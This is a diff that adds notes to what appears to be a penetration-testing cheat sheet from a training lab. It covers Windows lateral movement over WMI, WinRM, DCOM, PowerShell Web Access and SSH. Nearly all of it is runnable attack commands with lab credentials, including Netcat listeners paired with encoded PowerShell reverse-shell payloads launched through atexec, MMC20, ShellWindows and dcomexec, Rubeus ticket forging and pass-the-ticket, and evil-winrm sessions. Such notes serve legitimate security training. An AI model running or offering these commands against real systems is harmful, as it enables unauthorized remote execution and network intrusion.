@@ -65,3 +65,73 @@
 10. The atexec.py script utilizes the Windows Task Scheduler service, which is accessible through the atsvc SMB pipe:
     1. Start a Netcat listener: `nc -lnvp 8080`
     2. Pass the domain name, administrator user, password, and target IP address <domain>/<user>:<password>@<ip>, and lastly, we can pass our reverse shell payload to get executed. We can generate the reverse shell payload using revshells.com: `proxychains4 -q atexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="`
+## **Windows Management Instrumentation (WMI)**
+1. WMI Enumeration: `nmap -p135,49152-65535 10.129.229.244 -sV`
+2. To test credentials againts WMI we will use NetExec: `netexec wmi 10.129.229.244 -u helen -p RedRiot88`
+3. To retrieve detailed information about the operating system from a remote computer: `wmic /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version`
+4. Perform the same action using PowerShell:: `Get-WmiObject -Class Win32_OperatingSystem -ComputerName 172.20.0.52 | Select-Object Caption, CSDVersion, OSArchitecture, Version`
+5. Using WMIC to create a new process on a remote machine: `wmic /node:172.20.0.52 process call create "notepad.exe"`
+6. The same task can be accomplished using PowerShell: ` Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.20.0.52`
+7. Specify credentials to within wmic or PowerShell:
+    1. `wmic /user:username /password:password /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version`
+    2. `$credential = New-Object System.Management.Automation.PSCredential("username", (ConvertTo-SecureString "password" -AsPlainText -Force));`
+8. Lateral Movement From Linux:
+    1. Install: `sudo apt-get install wmi-client`
+    2. Run queries against a remote Windows machine: `wmic -U inlanefreight.local/helen%RedRiot88 //172.20.0.52 "SELECT Caption, CSDVersion, OSArchitecture, Version FROM Win32_OperatingSystem"`
+    3. Impacket includes the built-in script wmiexec.py for executing commands using WMI. Keep in mind that wmiexec.py uses port 445 to retreive the output of the command and if port 445 is blocked, it won't work: `wmiexec.py inlanefreight/helen:RedRiot88@172.20.0.52 whoami`
+    4. Use NetExec to run WMI queries or execute commands using WMI: `proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88 --wmi "SELECT * FROM Win32_OperatingSystem"`
+    5. To execute commands we can use the protocol wmi with the option -x <COMMAND>: `proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88 -x whoami`
+## **Windows Remote Management (WinRM)**
+1. Nmap scan: `nmap -p5985,5986 10.129.229.244 -sCV`
+2. To test credentials use NetExec: `netexec winrm 10.129.229.244 -u frewdy -p Kiosko093`
+#### **Lateral Movement From Windows:**
+1. Use Invoke-Command to execute commands on a remote system: ` Invoke-Command -ComputerName srv02 -ScriptBlock { hostname;whoami }`
+2. Specify credentials with the -Credential parameter:
+    1. `$username = "INLANEFREIGHT\Helen"`
+    2. `$password = "RedRiot88"`
+    3. `$securePassword = ConvertTo-SecureString $password -AsPlainText -Force`
+    4. `$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)`
+    5. `nvoke-Command -ComputerName 172.20.0.52 -Credential $credential -ScriptBlock { whoami; hostname }`
+3. winrs (Windows Remote Shell) is a command line tool allowing to execute commands on a Windows machine using WinRM remotely: `winrs -r:srv02 "powershell -c whoami;hostname"`
+4. winrs also allow us to use explicit credentials with the options /username:<username> and /password:<password> as follow: `winrs /remote:srv02 /username:helen /password:RedRiot88 "powershell -c whoami;hostname"`
+5. Copy files using a PowerShell session:
+    1. `$sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential`
+    2. Copy a file to the target machine: `Copy-Item -ToSession $sessionSRV02 -Path 'C:\Users\helen\Desktop\Sample.txt' -Destination 'C:\Users\helen\Desktop\Sample.txt' -Verbose`
+    3. Copy a file from the target machine: `Copy-Item -FromSession $sessionSRV02 -Path 'C:\Windows\System32\drivers\etc\hosts' -Destination 'C:\Users\helen\Desktop\host.txt' -Verbose`
+6. Use the Enter-PSSession cmdlet for an interactive shell using PowerShell remoting: `Enter-PSSession $sessionSRV02`
+7. Use kerberos tickets to connect to PowerShell remoting: 
+    1. First we need to forge our TGT: ` .\Rubeus.exe asktgt /user:leonvqz /rc4:32323DS033D176ABAAF6BEAA0AA681400 /nowrap`
+    2. Create a sacrificial process with the option createnetonly: `.\Rubeus.exe createnetonly /program:powershell.exe /show`
+    3. Import the TGT of the account we want to use: `.\Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooIEszCCBK9h...SNIP...`
+    4. Use this session to connect to the target machine: `Enter-PSSession SRV02.inlanefreight.local -Authentication Negotiate`
+#### **Lateral Movement From Linux**
+1. With NetExec we can use the option -x or -X to execute CMD or PowerShell commands: `netexec winrm 10.129.229.244 -u frewdy -p Kiosko093 -x "ipconfig"`
+2. Use evil-winrm to connect to a remote Windows machine and execute commands: `evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093`
+3. Evil-WinRM allows us to load PowerShell scripts: `evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093 -s '/home/plaintext/'`
+### **Windows PowerShell Web Access**
+1. **By default the URL path for PowerShell Web Access is `/pswa` and the port will be 80 or 443. The web directory and port can be changed.**
+## **Distributed Component Object Model (DCOM)**
+1. Nmap scan: `nmap -p135,49152-65535 10.129.229.244 -sCV -Pn`
+2. The MMC20.Application object allows remote interaction with Microsoft Management Console (MMC), enabling us to execute commands and manage administrative tasks on a Windows system through its graphical user interface components:
+    1. `nc -lnvp 8001`
+    2. `$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","172.20.0.52"));`
+    3. `$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==",0)`
+3. ShellWindows & ShellBrowserWindow:
+    1. Find the CLSID with the following script: `Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID' | ForEach-Object{Get-ItemProperty -Path $_.PSPath | Where-Object {$_.'(default)' -eq 'ShellWindows'} | Select-Object -ExpandProperty PSChildName}`
+    2. `$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","SRV02"))`
+    3. `$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","172.20.0.52"))`
+    4. ` nc -lnvp 8080`
+    5. Use a PowerShell reverse shell payload from revshells.com: `$shell[0].Document.Application.ShellExecute("cmd.exe","/c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==","C:\Windows\System32",$null,0)`
+4. dcomexec.py:
+    1. ` nc -lnvp 8080`
+    2. `proxychains4 -q python3 dcomexec.py -object MMC20 INLANEFREIGHT/Josias:Jonny25@172.20.0.52 "powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -silentcommand`
+## **Secure Shell (SSH)**
+1. Scan: `nmap 10.129.229.244 -p 22 -sCV -Pn`
+2. Test credentials using netexec: `netexec ssh 10.129.229.244 -u ambioris -p Ward@do9049`
+3. `ssh Ambioris@10.129.229.244`
+4. `ssh ambioris@srv01`
+5. `ssh -i C:\helen_id_rsa -l helen@inlanefreight.local -p 22 SRV01`
+6. `icacls.exe C:\helen_id_rsa`
+7. `copy C:\helen_id_rsa C:\Users\Ambioris\`
+8. ` icacls helen_id_rsa`
+9. `ssh -i C:\helen_id_rsa -l helen@inlanefreight.local -p 22 SRV01`
